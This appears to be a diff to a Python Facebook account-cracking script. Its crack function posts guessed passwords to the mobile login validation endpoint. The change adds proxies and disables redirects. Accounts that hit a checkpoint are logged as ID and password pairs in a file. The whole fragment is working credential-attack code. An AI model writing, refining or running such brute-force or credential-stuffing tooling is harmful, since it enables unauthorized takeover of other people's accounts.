@@ -946,7 +946,7 @@ def crack(idf,pwv):
     'user-agent': ua,
     'viewport-width': '980',
 }
-            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=
+            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False,proxies=proxs)
             if "checkpoint" in po.cookies.get_dict().keys():
                 #print(f'\r\x1b[32 \033[1;31m[DYAR-CP]\033[1;32m {idf} | {pw}')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
